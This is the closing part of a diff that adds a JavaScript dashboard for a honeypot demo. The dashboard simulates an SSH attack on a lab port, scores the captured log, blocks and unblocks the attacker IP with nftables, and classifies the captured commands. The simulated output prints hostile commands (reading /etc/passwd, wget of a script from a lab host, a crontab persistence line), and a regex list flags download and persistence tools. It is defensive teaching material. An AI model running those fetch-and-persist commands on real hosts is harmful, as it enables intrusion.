+    {name:"file_download", label:"File download", points:25, rules:["B08"]},
+    {name:"persistence_attempt", label:"Persistence attempt", points:15, rules:["B10","B11"]}
+  ]
+};
+const wait = (ms) => new Promise(r => setTimeout(r, ms));
+const SIM_ATTACK_MS = 4500;   // the real attack takes ~20 s
+
+async function simulate(id){
+  const ts = new Date().toTimeString().slice(0,8);
+  switch(id){
+    case "attack2222": {
+      await wait(SIM_ATTACK_MS);
+      if(SIM.blocked){
+        SIM.drops += 6 + Math.floor(Math.random()*4);
+        return {tone:"ok", summary:"BLOCKED: attacker could not reach port 2222",
+          command:"sudo ~/backup/lab_attack_2222.sh",
+          output:`[${ts}] connecting to 10.77.0.1:2222 as root …\nssh: connect to host 10.77.0.1 port 2222: Connection timed out\n[check] 10.77.0.2 present in block list at attack time: yes\nverdict: BLOCKED`};
+      }
+      SIM.attacked = true;
+      return {tone:"warn", summary:"Attacker got in on port 2222",
+        command:"sudo ~/backup/lab_attack_2222.sh",
+        output:`[${ts}] connecting to 10.77.0.1:2222 as root …\nroot@svr04:~# uname -a\nLinux svr04 3.2.0-4-amd64 #1 SMP Debian 3.2.68-1 x86_64 GNU/Linux\nroot@svr04:~# cat /etc/passwd | head -3\nroot@svr04:~# wget http://10.77.0.2/x.sh -O /tmp/x.sh\nroot@svr04:~# echo '* * * * * /tmp/x.sh' | crontab -\n[check] fake hostname "svr04" seen in output\nverdict: GOT IN`};
+    }
+    case "analyze": {
+      await wait(700);
+      if(!SIM.attacked) return {tone:"info", summary:"Score 0: no attack captured yet", command:"cp trap log → run scoring pipeline", output:"No sessions in the captured log.\nscore: 0\ndecision: OBSERVE", analysis:{score:0, decision:"OBSERVE", evidence:[]}};
+      return {tone:"info", summary:"Score 70: BLOCK_CANDIDATE", command:"cp trap log → run scoring pipeline",
+        output:"copied cowrie.json (4 events)\n  login_success        +20   [B02]\n  recon_commands       +10   [B04, B05]\n  file_download        +25   [B08]\n  persistence_attempt  +15   [B10, B11]\nscore: 70 / 100\ndecision: BLOCK_CANDIDATE", analysis:SIM_ANALYSIS};
+    }
+    case "block": {
+      await wait(350);
+      if(SIM.blocked) return {tone:"info", summary:"Already blocked, nothing changed", command:`ssh -i ~/.ssh/block_key lab-fw block ${LAB_IP}`, output:`${LAB_IP} is already in the block list.`};
+      SIM.blocked = true; SIM.drops = 0; SIM.expiresAt = Date.now() + 60*60*1000;
+      return {tone:"ok", summary:"Blocked 10.77.0.2 on port 2222 (port 2223 stays open)", command:`ssh -i ~/.ssh/block_key lab-fw block ${LAB_IP}`, output:`added ${LAB_IP} to honeycomb_block (timeout 3600s)\nrule: tcp dport 2222 ip saddr @honeycomb_block drop`};
+    }
+    case "verify": {
+      await wait(350);
+      if(!SIM.blocked) return {tone:"bad", summary:"NOT BLOCKED: 10.77.0.2 is not in the block list", command:"sudo nft list set inet filter honeycomb_block", output:"elements = { }"};
+      if(SIM.drops === 0) return {tone:"ok", summary:"BLOCKED, no attack attempted yet (0 packets)", command:"sudo nft list set inet filter honeycomb_block", output:`elements = { ${LAB_IP} timeout 1h }\ncounter packets 0 bytes 0`};
+      return {tone:"ok", summary:`BLOCKED, ${SIM.drops} packets dropped`, command:"sudo nft list set inet filter honeycomb_block", output:`elements = { ${LAB_IP} timeout 1h }\ncounter packets ${SIM.drops} bytes ${SIM.drops*60}`};
+    }
+    case "unblock": {
+      await wait(350);
+      if(!SIM.blocked) return {tone:"info", summary:"Already not blocked, nothing to undo", command:`ssh -i ~/.ssh/block_key lab-fw unblock ${LAB_IP}`, output:`${LAB_IP} was not in the block list.`};
+      SIM.blocked = false; SIM.expiresAt = null;
+      return {tone:"ok", summary:"Unblocked 10.77.0.2 on port 2222", command:`ssh -i ~/.ssh/block_key lab-fw unblock ${LAB_IP}`, output:`removed ${LAB_IP} from honeycomb_block`};
+    }
+    case "attack2223": {
+      await wait(SIM_ATTACK_MS);
+      return {tone:"info", summary:"Attacker reached the open trap on port 2223 and was recorded", command:"sudo ~/backup/lab_attack_2223.sh",
+        output:`[${ts}] connecting to 10.77.0.1:2223 as root …\nroot@svr04:~# id\nuid=0(root) gid=0(root) groups=0(root)\n[check] fake hostname "svr04" seen in output\nverdict: GOT IN (trap port, never blocked)`};
+    }
+  }
+}
+function simStatus(){ return {blocked:SIM.blocked, drops:SIM.drops, expiresAt:SIM.expiresAt}; }
+
+async function getStatus(){ return LIVE ? normalizeStatus(await serverGet(SERVER.status)) : simStatus(); }
+async function runOnServer(id){ return LIVE ? normalizeResult(await serverPost(SERVER.action(id))) : simulate(id); }
+/* Accepts the common field names so small differences in demo_gui.py still work. */
+const pick = (o, ...keys) => { for(const k of keys) if(o && o[k] !== undefined && o[k] !== null) return o[k]; };
+function normalizeStatus(s){
+  s = s || {};
+  const blocked = !!pick(s, "blocked", "is_blocked", "block_active", "in_blocklist");
+  const drops = Number(pick(s, "drops", "dropped", "packets", "dropped_packets", "counter") || 0);
+  let expiresAt = pick(s, "expiresAt", "expires_at");
+  const left = pick(s, "expires_in", "timeout_left", "ttl", "seconds_left");
+  if(expiresAt && expiresAt < 1e12) expiresAt *= 1000;          // seconds → ms
+  if(!expiresAt && left != null) expiresAt = Date.now() + Number(left) * 1000;
+  return {blocked, drops, expiresAt: blocked ? (expiresAt || null) : null};
+}
+function normalizeResult(r){
+  r = r || {};
+  const summary = String(pick(r, "summary", "message", "result", "msg") ?? "Done");
+  let tone = pick(r, "tone", "level", "color");
+  const map = {success:"ok", green:"ok", error:"bad", fail:"bad", red:"bad", warning:"warn", yellow:"warn", blue:"info"};
+  tone = map[tone] || tone;
+  if(!["ok","bad","warn","info"].includes(tone)) tone = r.ok === false ? "bad" : "info";
+  let analysis = pick(r, "analysis", "score_data");
+  if(!analysis && r.score != null) analysis = {score:r.score, decision:r.decision, evidence:r.evidence};
+  if(analysis && analysis.evidence) analysis.evidence = analysis.evidence.map(e => ({
+    name: pick(e, "name", "id", "type"), label: e.label,
+    points: Number(pick(e, "points", "score", "weight") || 0),
+    rules: pick(e, "rules", "behaviors", "behaviours") || []
+  }));
+  const output = pick(r, "output", "raw", "stdout", "log");
+  return {tone, summary, analysis,
+    command: String(pick(r, "command", "cmd") ?? ""),
+    output: typeof output === "string" ? output : JSON.stringify(output ?? r, null, 2)};
+}
+
+/* =====================================================================
+   3. UI
+   ===================================================================== */
+const ICONS = {
+  attack:'<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="4" width="18" height="13" rx="2"/><path d="M7 9l3 2-3 2M12 13h4M8 21h8"/></svg>',
+  analyze:'<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M4 20V10M10 20V4M16 20v-7M22 20H2"/></svg>',
+  block:'<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><circle cx="12" cy="12" r="9"/><path d="M5.6 5.6l12.8 12.8"/></svg>',
+  verify:'<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 3l8 3v6c0 4.5-3.4 8-8 9-4.6-1-8-4.5-8-9V6z"/><path d="M8.5 12l2.5 2.5 4.5-5"/></svg>',
+  unblock:'<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 12a9 9 0 1 0 3-6.7"/><path d="M3 4v5h5"/></svg>',
+  trap:'<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linejoin="round"><path d="M12 2l8 4.5v9L12 20l-8-4.5v-9z"/><circle cx="12" cy="11" r="2.5"/></svg>'
+};
+const ACTIONS = [
+  {id:"attack2222", n:1, title:"Attack port 2222", sub:"lab_attack_2222.sh", desc:"The scripted attacker logs in and runs commands on the protected port.", btn:"Run attack", cls:"c-att", icon:"attack", est:20, target:"p1"},
+  {id:"analyze",   n:2, title:"Analyze attack",   sub:"copy log + pipeline", desc:"Scores the captured log: evidence, points and the final decision.", btn:"Analyze (score)", cls:"c-info", icon:"analyze", est:1},
+  {id:"block",     n:3, title:"Block attacker",   sub:"restricted SSH key", desc:"Adds 10.77.0.2 to the block list. Port 2222 will drop its packets.", btn:"Block 10.77.0.2", cls:"c-bad", icon:"block", est:1},
+  {id:"verify",    n:4, title:"Verify block",     sub:"firewall counter", desc:"Reads the firewall counter to prove packets were really dropped.", btn:"Verify", cls:"c-ok", icon:"verify", est:1},
+  {id:"unblock",   n:5, title:"Unblock (rollback)", sub:"one command", desc:"Removes 10.77.0.2 from the block list with one command.", btn:"Unblock 10.77.0.2", cls:"c-warn", icon:"unblock", est:1},
+  {id:"attack2223", n:6, title:"Attack port 2223", sub:"open trap", desc:"Attacks the open trap. It is never blocked, so it keeps recording.", btn:"Attack open trap", cls:"c-att", icon:"trap", est:20, target:"p2"}
+];
+const STEPS = [
+  {a:"attack2222", t:"Attacker gets in",       cap:"The attacker logs in to port 2222 and runs commands."},
+  {a:"analyze",    t:"Score the evidence",     cap:"The pipeline reads the captured log and scores it."},
+  {a:"block",      t:"Block the attacker",     cap:"The score crosses the line, so 10.77.0.2 is blocked."},
+  {a:"attack2222", t:"Attack again: refused",  cap:"Same attack on 2222. This time it cannot get in."},
+  {a:"verify",     t:"Prove the drop",         cap:"The firewall counter shows packets were really dropped."},
+  {a:"attack2223", t:"Trap still records",     cap:"Port 2223 stays open, so the honeypot keeps collecting."},
+  {a:"unblock",    t:"Roll back",              cap:"One command removes the block."}
+];
+const byId = Object.fromEntries(ACTIONS.map(a => [a.id, a]));
+const $ = (id) => document.getElementById(id);
+let busy = false, stepIdx = 0, status = {blocked:false, drops:0, expiresAt:null}, logRows = 0;
+
+/* --- render action cards --- */
+$("actions").innerHTML = ACTIONS.map(a => `
+  <article class="act ${a.cls}" id="card-${a.id}">
+    <div class="act-h"><div class="act-ico">${ICONS[a.icon]}</div>
+      <div><h3>${a.n}. ${a.title}</h3><div class="sub">${a.sub}</div></div></div>
+    <p>${a.desc}</p>
+    <div style="display:grid;gap:8px">
+      <button class="btn" type="button" data-act="${a.id}" id="btn-${a.id}">${a.btn} <span class="kbd">${a.n}</span></button>
+      <div class="res" id="res-${a.id}">${a.est >= 20 ? "Takes about 20 seconds" : "Takes under a second"}</div>
+    </div>
+    <div class="prog" id="prog-${a.id}"></div>
+  </article>`).join("");
+document.querySelectorAll("[data-act]").forEach(b => b.addEventListener("click", () => run(b.dataset.act)));
+
+/* --- guided steps --- */
+function renderSteps(){
+  $("steps").innerHTML = STEPS.map((s,i) => `<li class="step ${i<stepIdx?"done":""} ${i===stepIdx?"cur":""}"><div class="n">${i<stepIdx?"✓":"0"+(i+1)}</div><div class="t">${s.t}</div><div class="bar"></div></li>`).join("");
+  const done = stepIdx >= STEPS.length;
+  $("gEyebrow").textContent = done ? "Demo complete" : `Step ${stepIdx+1} of ${STEPS.length}`;
+  $("gTitle").textContent = done ? "All seven steps shown" : STEPS[stepIdx].t;
+  $("gCaption").textContent = done ? "Got in, scored, blocked, proved, trap kept recording, rolled back." : STEPS[stepIdx].cap;
+  $("gNext").innerHTML = done ? 'Done' : `Run step ${stepIdx+1}: ${byId[STEPS[stepIdx].a].title} <span class="kbd">N</span>`;
+  $("gNext").disabled = done || busy;
+  document.querySelectorAll(".act").forEach(c => c.classList.remove("next"));
+  if(!done) $("card-"+STEPS[stepIdx].a).classList.add("next");
+}
+$("gNext").addEventListener("click", () => { if(stepIdx < STEPS.length) run(STEPS[stepIdx].a); });
+$("gReset").addEventListener("click", () => { stepIdx = 0; for(const k in FACTS) delete FACTS[k]; renderSteps(); renderFinale(); });
+
+/* --- topology / status --- */
+function fmtLeft(ms){ if(ms<=0) return "now"; const s=Math.floor(ms/1000); const m=Math.floor(s/60); return `${m}:${String(s%60).padStart(2,"0")}`; }
+function renderStatus(){
+  const b = status.blocked;
+  const fwC = b ? "#ff5c62" : "#36d399";
+  $("fwShield").setAttribute("stroke", fwC);
+  $("fwGlowStop").setAttribute("stop-color", fwC);
+  $("fwIcon").setAttribute("stroke", fwC);
+  $("fwIcon").innerHTML = b ? '<path d="M-14 -16 l28 28 M14 -16 l-28 28"/>' : '<path d="M-14 -4 l9 9 l19 -20"/>';
+  $("fwState").textContent = b ? "BLOCKING" : "OPEN";
+  $("fwState").setAttribute("fill", fwC); $("fwState").style.fill = fwC;
+  $("fwSub").textContent = b ? `Dropping 10.77.0.2 → 2222` : "No rule for 10.77.0.2";
+  $("p1State").textContent = b ? "DROPPING" : "ACCEPTING";
+  $("p1State").setAttribute("fill", fwC);
+  $("p1Stripe").setAttribute("fill", fwC);
+  $("p1Sub").textContent = b ? "Packets from 10.77.0.2 are dropped" : "Stands for the real service";
+  $("w2").setAttribute("class", "wire " + (b ? "cut" : "flow"));
+  $("stBlock").textContent = b ? "BLOCKED" : "Not blocked";
+  $("stBlock").style.color = b ? "var(--bad)" : "var(--ok)";
+  $("stBlockS").textContent = b ? "10.77.0.2 · port 2222 only" : "No entry for 10.77.0.2";
+  $("stDrops").textContent = status.drops ?? 0;
+  $("stDrops").style.color = status.drops > 0 ? "var(--bad)" : "var(--text)";
+  if(b && status.expiresAt){ $("stExp").textContent = fmtLeft(status.expiresAt - Date.now()); $("stExpS").textContent = "Then removed automatically"; }
+  else { $("stExp").textContent = "—"; $("stExpS").textContent = "Nothing to expire"; }
+}
+async function refresh(){
+  try{
+    status = await getStatus();
+    renderStatus();
+    $("lastRefresh").textContent = "Updated " + new Date().toLocaleTimeString();
+  }catch(e){
+    $("lastRefresh").textContent = "Status refresh failed: " + e.message;
+  }
+}
+setInterval(() => { if(status.blocked && status.expiresAt) $("stExp").textContent = fmtLeft(status.expiresAt - Date.now()); }, 1000);
+
+/* --- packet animation --- */
+const reduceMotion = matchMedia("(prefers-reduced-motion: reduce)").matches;
+let packetTimer = null;
+function firePacket(target){
+  if(reduceMotion) return;
+  const g = $("packets"), ns = "http://www.w3.org/2000/svg";
+  const c = document.createElementNS(ns, "circle");
+  c.setAttribute("r", 5); c.setAttribute("fill", "#b18cff");
+  g.appendChild(c);
+  const p1 = $("w1"), p2 = target === "p1" ? $("w2") : $("w3");
+  const L1 = p1.getTotalLength(), L2 = p2.getTotalLength();
+  const blockedHere = target === "p1" && status.blocked;
+  const T1 = 700, T2 = 600; let t0 = null;
+  function frame(ts){
+    if(!t0) t0 = ts; const t = ts - t0;
+    if(t < T1){ const pt = p1.getPointAtLength(L1 * t/T1); c.setAttribute("cx", pt.x); c.setAttribute("cy", pt.y); }
+    else if(blockedHere){
+      // stopped at the firewall: red burst
+      const k = Math.min(1, (t-T1)/350);
+      c.setAttribute("cx", 420); c.setAttribute("cy", 150);
+      c.setAttribute("fill", "#ff5c62"); c.setAttribute("r", 5 + 14*k); c.setAttribute("opacity", 1-k);
+      if(k >= 1){ c.remove(); return; }
+    } else {
+      const k = Math.min(1, (t-T1)/T2);
+      const pt = p2.getPointAtLength(L2 * k); c.setAttribute("cx", pt.x); c.setAttribute("cy", pt.y);
+      if(target === "p2") c.setAttribute("fill", "#ffc53d");
+      if(k >= 1){ c.remove(); return; }
+    }
+    requestAnimationFrame(frame);
+  }
+  requestAnimationFrame(frame);
+}
+function startTraffic(target){ stopTraffic(); $("w1").classList.add("hot"); firePacket(target); packetTimer = setInterval(() => firePacket(target), 420); }
+function stopTraffic(){ clearInterval(packetTimer); packetTimer = null; $("w1").classList.remove("hot"); }
+
+/* --- analysis --- */
+function renderAnalysis(an){
+  const s = Math.max(0, Math.min(100, an.score|0));
+  $("gArc").setAttribute("stroke-dasharray", `${s} 100`);
+  $("gArc").style.transition = "stroke-dasharray 1s cubic-bezier(.2,.8,.2,1)";
+  $("gNeedle").style.transition = "transform 1s cubic-bezier(.2,.8,.2,1)";
+  $("gNeedle").setAttribute("transform", `rotate(${-90 + s*1.8} 120 125)`);
+  countUp($("gNum"), s);
+  const isBlock = /BLOCK/.test(an.decision || "");
+  const v = $("verdict"); v.className = "verdict " + (isBlock ? "bad" : "ok"); v.textContent = an.decision || "—";
+  $("scoreMeta").textContent = (isBlock ? "Recommends a block" : "Keep observing") +
+    (BLOCK_THRESHOLD != null ? ` · block threshold ${BLOCK_THRESHOLD}` : " · risk score out of 100");
+  const ev = an.evidence || [];
+  if(!ev.length){ $("evid").innerHTML = '<div class="empty"><b>No evidence found</b>The captured log has no suspicious behaviour.</div>'; return; }
+  const max = Math.max(...ev.map(e => e.points));
+  const total = ev.reduce((a,e) => a + e.points, 0);
+  $("evid").innerHTML = ev.map(e => `
+    <div class="ev"><div><div class="name">${e.label || e.name}</div><div class="code">${e.name}</div></div>
+      <div class="track"><div class="fill" data-w="${(e.points/max*100).toFixed(1)}"></div></div>
+      <div class="pts num">+${e.points}</div>
+      <div class="rules">${(e.rules||[]).map(r => `<span class="chip" tabindex="0" ${RULES[r] ? `data-tip="${r}: ${RULES[r]}"` : ""}>${r}</span>`).join("")}</div></div>`).join("") +
+    `<div class="rule-legend">Hover a rule code to see what it detects.</div>` +
+    `<div class="ev-sum"><span>${ev.length} pieces of evidence · ${ev.reduce((a,e)=>a+(e.rules||[]).length,0)} rules matched</span><span>Total <b class="num">${total}</b></span></div>`;
+  requestAnimationFrame(() => requestAnimationFrame(() => document.querySelectorAll(".ev .fill").forEach(f => f.style.width = f.dataset.w + "%")));
+  $("anAside").textContent = "Scored " + new Date().toLocaleTimeString();
+}
+function countUp(el, to){
+  if(reduceMotion){ el.textContent = to; return; }
+  const t0 = performance.now(), D = 900;
+  (function f(t){ const k = Math.min(1,(t-t0)/D); el.textContent = Math.round(to*(1-Math.pow(1-k,3))); if(k<1) requestAnimationFrame(f); })(t0);
+}
+
+/* --- log & raw --- */
+const esc = (s) => String(s ?? "").replace(/[&<>]/g, c => ({"&":"&amp;","<":"&lt;",">":"&gt;"}[c]));
+function addLog(a, r, secs){
+  if(logRows === 0) $("logBody").innerHTML = "";
+  logRows++;
+  const tr = document.createElement("tr"); tr.className = "new";
+  tr.innerHTML = `<td class="t">${new Date().toLocaleTimeString()}</td><td class="a">${a.title}</td><td><span class="tag tone-${r.tone}">${esc(r.summary)}</span></td><td class="d">${secs.toFixed(1)} s</td>`;
+  $("logBody").prepend(tr);
+  $("logCount").textContent = `${logRows} action${logRows===1?"":"s"}`;
+}
+function showRaw(r){
+  const out = esc(r.output)
+    .replace(/(root@svr04:~#)/g, '<span class="hl">$1</span>')
+    .replace(/(verdict: BLOCKED|BLOCKED)/g, '<span class="p">$1</span>')
+    .replace(/(Connection timed out|error.*)/gi, '<span class="er">$1</span>');
+  $("raw").innerHTML = `<span class="p">kali@honeycomb</span>:<span style="color:var(--info)">~/honeycomb-test</span>$ ${esc(r.command)}\n${out}`;
+  $("rawTitle").textContent = r.command;
+}
+$("copyRaw").addEventListener("click", async () => {
+  const txt = $("raw").innerText;
+  try{ await navigator.clipboard.writeText(txt); $("copyRaw").textContent = "Copied"; }
+  catch{ const sel = getSelection(), rg = document.createRange(); rg.selectNodeContents($("raw")); sel.removeAllRanges(); sel.addRange(rg); $("copyRaw").textContent = "Selected"; }
+  setTimeout(() => $("copyRaw").textContent = "Copy", 1400);
+});
+
+/* --- threshold line on the gauge --- */
+if(BLOCK_THRESHOLD != null){
+  $("gThresh").hidden = false;
+  $("gThresh").setAttribute("transform", `rotate(${-90 + BLOCK_THRESHOLD*1.8} 120 125)`);
+}
+
+/* --- pipeline: how one attack becomes a block --- */
+const PIPE = [
+  {n:"Trap",     d:"Honeypot records the session"},
+  {n:"Log",      d:"Copied out of the trap"},
+  {n:"Evidence", d:"Behaviours pulled from the log"},
+  {n:"Rules",    d:"Each B-rule adds points"},
+  {n:"Score",    d:"Points summed, out of 100"},
+  {n:"Decision", d:"Block or keep observing"},
+  {n:"Firewall", d:"Drops 10.77.0.2 on 2222"}
+];
+const pipeState = PIPE.map(() => "");
+function renderPipe(){
+  $("pipe").innerHTML = PIPE.map((p,i) => `<div class="ps ${pipeState[i]}"><div class="pd">${pipeState[i].includes("done") ? "✓" : i+1}</div><div class="nm">${p.n}</div><div class="ds">${p.d}</div></div>`).join("");
+}
+function setPipe(i, s){ pipeState[i] = s; renderPipe(); }
+async function cascade(from, to, lastDanger){
+  for(let i = from; i <= to; i++){
+    setPipe(i, "active");
+    if(!reduceMotion) await wait(260);
+    setPipe(i, "done" + (i === to && lastDanger ? " danger" : ""));
+  }
+}
+renderPipe();
+
+/* --- captured commands --- */
+let captured = [];
+function kindOf(c){
+  if(/\b(wget|curl|tftp|scp|ftpget)\b/.test(c)) return ["Download","bad"];
+  if(/crontab|authorized_keys|\.bashrc|systemctl|rc\.local|useradd|passwd\s+\w/.test(c)) return ["Persistence","bad"];
+  if(/\b(uname|whoami|id|w|ifconfig|hostname|lscpu|nproc|ps|free|df)\b|\/etc\/passwd|\/proc\//.test(c)) return ["Reconnaissance","warn"];
+  return ["Command","info"];
+}
+function captureFrom(output, port){
+  const cmds = [...String(output || "").matchAll(/@svr04:\S*\s?[#$]\s*(\S.*)/g)].map(m => m[1].trim());
+  const t = new Date().toLocaleTimeString();
+  cmds.forEach(c => captured.unshift({t, port, c}));
+  if(!captured.length) return;
+  $("capCount").textContent = `${captured.length} command${captured.length===1?"":"s"} recorded`;
+  $("capList").innerHTML = captured.map(x => { const [k,tone] = kindOf(x.c);
+    return `<div class="cap-row"><span class="t">${x.t}</span><span class="port">:${x.port}</span><code>${esc(x.c)}</code><span class="kind ${tone}">${k}</span></div>`; }).join("");
+}
+
+/* --- finale: the whole story in one row --- */
+const FACTS = {};
+function renderFinale(){
+  const done = stepIdx >= STEPS.length;
+  $("finale").hidden = !done;
+  if(!done) return;
+  const card = (tone,k,v,s) => `<div class="fc ${tone}"><div class="k">${k}</div><div class="v">${v}</div><div class="s">${s}</div></div>`;
+  $("finale").innerHTML =
+    card("warn","Before the block", "Got in", FACTS.before ? `Logged in to port 2222 in ${FACTS.before.toFixed(1)} s` : "Logged in to port 2222") +
+    card("bad","Analysis", FACTS.score ? `Score ${FACTS.score.score}` : "Scored", FACTS.score ? FACTS.score.decision : "Evidence collected") +
+    card("ok","After the block", "Refused", FACTS.drops != null ? `${FACTS.drops} packets dropped by the firewall` : "Port 2222 dropped the attacker") +
+    card("info","Trap port 2223", "Still recording", "The honeypot keeps collecting data") +
+    card("ok","Rollback", "One command", FACTS.rollback ? `Unblocked in ${FACTS.rollback.toFixed(1)} s` : "Block removed cleanly");
+}
+
+/* --- full screen for the projector --- */
+function toggleFs(){
+  try{
+    if(document.fullscreenElement) document.exitFullscreen?.();
+    else document.documentElement.requestFullscreen?.()?.catch?.(() => {});
+  }catch{}
+}
+$("fsBtn").addEventListener("click", toggleFs);
+
+/* --- run an action --- */
+async function run(id){
+  if(busy) return;
+  const a = byId[id]; busy = true;
+  document.querySelectorAll("[data-act]").forEach(b => b.disabled = true);
+  $("gNext").disabled = true;
+  const card = $("card-"+id), btn = $("btn-"+id), res = $("res-"+id), prog = $("prog-"+id);
+  card.classList.add("running");
+  btn.innerHTML = `<span class="spin"></span> Running…`;
+  res.className = "res"; res.textContent = "";
+  setMode(true);
+  if(id === "analyze") setPipe(1, "active");
+  if(a.target){ setPipe(0, "active"); startTraffic(a.target); $("stLast").textContent = "In progress"; $("stLast").style.color = "var(--attacker)"; $("stLastS").textContent = "Port " + (a.target==="p1"?"2222":"2223"); }
+  const estMs = (LIVE ? a.est : (a.est >= 20 ? SIM_ATTACK_MS/1000 : a.est)) * 1000;
+  const t0 = performance.now();
+  const tick = setInterval(() => {
+    const el = performance.now() - t0;
+    prog.style.width = Math.min(96, el/estMs*100) + "%";
+    if(a.est >= 20) res.textContent = `${(el/1000).toFixed(0)} s elapsed`;
+  }, 200);
+  let r;
+  try{ r = await runOnServer(id); }
+  catch(e){ r = {tone:"bad", summary:"Server error: " + e.message, command:SERVER.action(id), output:String(e)}; }
+  clearInterval(tick); stopTraffic();
+  const secs = (performance.now() - t0)/1000;
+  prog.style.width = "100%"; setTimeout(() => { prog.style.transition = "none"; prog.style.width = "0"; requestAnimationFrame(() => prog.style.transition = ""); }, 600);
+  card.classList.remove("running");
+  btn.innerHTML = `${a.btn} <span class="kbd">${a.n}</span>`;
+  res.className = "res " + r.tone; res.textContent = r.summary;
+  if(a.target){
+    $("stLast").textContent = r.tone === "warn" ? "Got in" : (/BLOCKED/.test(r.summary) ? "Blocked" : (r.tone === "bad" ? "Error" : "Recorded"));
+    $("stLast").style.color = `var(--${r.tone})`;
+    $("stLastS").textContent = "Port " + (a.target==="p1"?"2222":"2223") + " · " + new Date().toLocaleTimeString();
+  }
+  /* pipeline + facts for the finale */
+  if(a.target){
+    const gotIn = r.tone === "warn" || (a.target === "p2" && r.tone !== "bad");
+    if(gotIn){ setPipe(0, "done"); captureFrom(r.output, a.target === "p1" ? 2222 : 2223); }
+    else setPipe(0, pipeState[0] === "active" ? "" : pipeState[0]);
+    if(id === "attack2222" && r.tone === "warn") FACTS.before = secs;
+  }
+  if(id === "analyze" && r.analysis){
+    FACTS.score = r.analysis;
+    await cascade(1, 5, /BLOCK/.test(r.analysis.decision || ""));
+  }
+  if(id === "block" && r.tone === "ok") setPipe(6, "done");
+  if(id === "unblock" && r.tone !== "bad"){ setPipe(6, ""); FACTS.rollback = secs; }
+  if(r.analysis) renderAnalysis(r.analysis);
+  addLog(a, r, secs); showRaw(r);
+  if(stepIdx < STEPS.length && STEPS[stepIdx].a === id && r.tone !== "bad") stepIdx++;
+  busy = false; setMode(false);
+  document.querySelectorAll("[data-act]").forEach(b => b.disabled = false);
+  await refresh();
+  if(id === "verify" && r.tone === "ok") FACTS.drops = status.drops;
+  renderSteps(); renderFinale();
+}
+
+/* --- mode pill --- */
+function setMode(running){
+  const p = $("modePill");
+  p.className = "pill " + (running ? "busy" : (LIVE ? "live" : "demo"));
+  $("modeTxt").textContent = running ? "Running action…" : (LIVE ? "Connected to lab" : "Demo mode · simulated data");
+}
+
+/* --- keyboard --- */
+addEventListener("keydown", (e) => {
+  if(e.target.closest("input,textarea") || e.metaKey || e.ctrlKey || e.altKey) return;
+  if(e.key === "n" || e.key === "N"){ $("gNext").click(); }
+  if(e.key === "f" || e.key === "F"){ toggleFs(); }
+  const a = ACTIONS.find(x => String(x.n) === e.key); if(a) run(a.id);
+});
+
+/* --- boot --- */
+(async function boot(){
+  try{ await serverGet(SERVER.status).then(s => { LIVE = true; status = normalizeStatus(s); }); }
+  catch{ LIVE = false; }
+  setMode(false);
+  $("footMode").textContent = LIVE ? "Live data from demo_gui.py" : "Server not reachable: showing a simulation";
+  renderSteps(); await refresh();
+  setInterval(() => { if(!busy) refresh(); }, 4000);
+})();
+</script>
+
+</body></html>
